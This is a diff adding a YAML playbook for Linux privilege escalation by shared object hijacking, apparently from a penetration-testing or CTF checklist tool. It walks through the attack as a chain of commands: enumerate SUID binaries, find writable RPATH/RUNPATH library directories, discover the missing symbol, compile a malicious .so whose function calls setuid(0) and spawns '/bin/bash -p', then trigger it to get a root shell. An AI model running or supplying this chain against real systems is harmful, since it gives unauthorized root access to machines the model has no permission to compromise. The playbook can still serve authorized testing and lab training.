@@ -1,0 +1,145 @@
+name: Linux Privilege Escalation - Shared Object Hijacking
+
+steps:
+
+# =========================================================
+# [1] ENUMERATE SUID BINARIES
+# =========================================================
+- title: Enumerate SUID Binaries
+  mode: enum
+  info: |
+    Identify SUID binaries that may load vulnerable shared libraries.
+
+  entries:
+
+    - cmd: "find / -perm -4000 2>/dev/null"
+      info: enumerate SUID binaries
+
+      look_for:
+        - "custom binaries"
+        - "non-standard applications"
+        - "development binaries"
+        - "internal tools"
+
+  notes:
+    - custom SUID binaries are highest priority
+    - enterprise/internal apps commonly vulnerable
+    - GTFOBins should still be checked first
+
+# =========================================================
+# [2] CHECK SHARED LIBRARIES
+# =========================================================
+- title: Inspect Shared Libraries
+  mode: enum
+  info: |
+    Identify libraries loaded by target binary.
+
+  entries:
+
+    - cmd: "ldd ./binary"
+      info: list loaded shared libraries
+
+      look_for:
+        - "non-standard library paths"
+        - ".so files in writable directories"
+        - "custom libraries"
+        - "missing libraries"
+
+    - cmd: "readelf -d ./binary | grep PATH"
+      info: inspect RPATH/RUNPATH
+
+      look_for:
+        - "RUNPATH"
+        - "RPATH"
+        - "custom library directories"
+
+    - cmd: "ls -ld /path/"
+      info: check permissions on library directory
+
+      look_for:
+        - "world writable"
+        - "group writable"
+
+  notes:
+    - writable library paths are the vulnerability
+    - RUNPATH/RPATH controls library search order
+    - attacker-controlled .so gets loaded as root
+
+# =========================================================
+# [3] IDENTIFY REQUIRED FUNCTION
+# =========================================================
+- title: Identify Missing Function
+  mode: chain
+  info: |
+    Trigger binary and identify missing symbol/function.
+
+  entries:
+
+    - cmd: "cp /lib/x86_64-linux-gnu/libc.so.6 /writable/libshared.so"
+      info: place temporary library
+
+    - cmd: "./binary"
+      info: trigger symbol lookup error
+
+      look_for:
+        - "undefined symbol"
+        - "symbol lookup error"
+
+  notes:
+    - error reveals required function name
+    - function must exist inside malicious library
+
+# =========================================================
+# [4] BUILD MALICIOUS SHARED OBJECT
+# =========================================================
+- title: Build Malicious Shared Object
+  mode: chain
+  info: |
+    Create malicious shared library containing required function.
+
+  entries:
+
+    - cmd: "nano src.c"
+      info: create malicious library source
+
+    - cmd: "gcc src.c -fPIC -shared -o /writable/libshared.so"
+      info: compile malicious shared object
+
+    - cmd: "ls -l /writable/libshared.so"
+      info: verify compilation
+
+  code: |
+    #include <stdio.h>
+    #include <stdlib.h>
+    #include <unistd.h>
+
+    void dbquery() {
+        setuid(0);
+        setgid(0);
+        system("/bin/bash -p");
+    }
+
+  notes:
+    - replace dbquery with discovered function name
+    - binary loads attacker-controlled .so
+    - payload executes as binary owner (usually root)
+
+# =========================================================
+# [5] EXECUTE TARGET BINARY
+# =========================================================
+- title: Trigger Shared Object Hijack
+  mode: chain
+  info: |
+    Execute vulnerable binary to load malicious library.
+
+  entries:
+
+    - cmd: "./binary"
+      info: execute vulnerable SUID binary
+
+    - cmd: "id"
+      info: verify root access
+
+  notes:
+    - malicious library executes automatically
+    - successful hijack usually results in root shell
